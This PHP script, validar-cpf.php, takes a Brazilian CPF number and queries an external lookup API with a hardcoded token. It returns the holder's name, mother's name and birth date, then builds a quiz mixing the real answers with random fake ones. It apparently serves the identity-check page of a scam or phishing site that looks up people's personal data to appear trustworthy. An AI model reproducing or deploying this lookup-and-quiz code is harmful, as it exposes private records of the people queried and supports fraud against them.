<?php
// validar-cpf.php
header('Content-Type: application/json');

// Permitir apenas método POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Método não permitido.']);
    exit;
}

// Ler corpo JSON da requisição
$input = json_decode(file_get_contents('php://input'), true);
$cpf = isset($input['cpf']) ? preg_replace('/\D/', '', $input['cpf']) : '';

if (strlen($cpf) !== 11) {
    echo json_encode(['error' => 'CPF inválido.']);
    exit;
}

// Endpoint da API externa
$token = '1528';
$url = "https://searchapi.dnnl.live/consulta?cpf={$cpf}&token_api={$token}";

// Chamar API externa
$options = [
    'http' => [
        'method' => 'GET',
        'header' => [
            'Accept: application/json'
        ],
        'timeout' => 10
    ]
];
$context = stream_context_create($options);
$response = @file_get_contents($url, false, $context);

if ($response === false) {
    echo json_encode(['error' => 'Não foi possível conectar à API.']);
    exit;
}

$data = json_decode($response, true);

// Verifica se retornou erro ou se CPF não existe
if (!$data || $data['status'] !== 200 || empty($data['dados'])) {
    echo json_encode(['error' => 'CPF não encontrado ou inválido.']);
    exit;
}

// Pega o primeiro registro dos dados retornados
$pessoa = $data['dados'][0];

// Retorna os dados originais esperados pelo JS
$dados_originais = [
    'cpf' => $cpf,
    'nome' => $pessoa['NOME'] ?? '',
    'nome_mae' => $pessoa['NOME_MAE'] ?? '',
    'data_nascimento' => $pessoa['NASC'] ?? ''
];

// Dados extras para o quiz
$quiz = [
    'nomes' => gerarOpcoes($pessoa['NOME']),
    'maes' => gerarOpcoes($pessoa['NOME_MAE']),
    'datas' => gerarOpcoes($pessoa['NASC'], 'data')
];

// Retorna resposta JSON
$response = [
    'dados_originais' => $dados_originais,
    'quiz' => $quiz
];
echo json_encode($response);
exit;

// Funções auxiliares para gerar opções do quiz
function gerarOpcoes($correto, $tipo = 'texto') {
    $opcoes = [$correto];
    // Gera 2 opções "fakes" dependendo do tipo
    if ($tipo === 'data') {
        for ($i = 0; $i < 2; $i++) {
            $ano = rand(1950, 2010);
            $mes = rand(1, 12);
            $dia = rand(1, 28);
            $fake = sprintf('%04d-%02d-%02d', $ano, $mes, $dia);
            if (!in_array($fake, $opcoes)) {
                $opcoes[] = $fake;
            }
        }
    } else {
        for ($i = 0; $i < 2; $i++) {
            $fake = substr(str_shuffle('ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, rand(8, 13)) . ' ' . substr(str_shuffle('ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, rand(6, 12));
            if (!in_array($fake, $opcoes)) {
                $opcoes[] = $fake;
            }
        }
    }
    shuffle($opcoes);
    return $opcoes;
}
